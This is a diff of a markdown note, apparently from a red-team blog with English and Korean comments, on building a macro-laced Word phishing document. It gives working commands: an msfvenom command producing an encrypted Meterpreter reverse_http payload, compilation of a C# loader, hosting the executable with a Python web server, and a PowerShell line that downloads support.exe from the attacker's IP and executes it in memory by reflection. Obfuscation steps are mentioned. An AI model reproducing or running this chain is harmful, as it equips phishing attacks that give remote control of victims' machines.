@@ -1,22 +1,42 @@
-```
-logic flow:
-msfvenom -> and place it in C# NET LOADder. This will load the shell.  
- msfvenom -p windows/x64/meterpreter/reverse_http lhost=192.168.20.131 lport=443 --encrypt aes256 --encrypt-key 'qaG+eb3eShkiYq3tuv9y!B&E)$@Mc%fT' --encrypt-iv '?aEe(fG+KbPe23fz' -f csharp
+---
+title: "Word Document Macro Phishing"
+categories:
+  - phishing
+tags:
+  - maldoc
+  - vba
+  - macro
+  - powershell
+excerpt: "Weaponizing a Word document with a VBA macro that runs an obfuscated PowerShell reflective loader to fetch and execute a Meterpreter stager."
+---
 
+logic flow:
+
+msfvenom -> and place it in C# NET LOADder. This will load the shell.  
+
+```bash
+ msfvenom -p windows/x64/meterpreter/reverse_http lhost=192.168.20.131 lport=443 --encrypt aes256 --encrypt-key 'qaG+eb3eShkiYq3tuv9y!B&E)$@Mc%fT' --encrypt-iv '?aEe(fG+KbPe23fz' -f csharp
+```
 
 MeterStager.cs save the C# Loader file as .exe 
+
+```bash
 mcs meterstager.cs
+```
 
 공격자 칼리에서 .exe를 호스팅함
+
+```bash
 python -m http.server 9999
+```
 
 Powershell reflection 명령어을 통해서 .exe content를 가져와서 엔트리 포인트에서 시작하게함
 위에 powershell reflection 명령어를 Invoke-VBAps.ps1에 넣어서 vba friendly하게 만듬
 .이제 vba는 vba 난독화, powershell부분은 charmeleon사용하기
 
-```
-```
 Invoke VBA
+
+```powershell
 $s = @'
  iex([System.Reflection.Assembly]::Load((New-Object net.webclient).DownloadData('http://192.168.20.131:9999/support.exe'))).EntryPoint.Invoke($null, [Object[]]@(@(,([String[]]@()))))
 '@
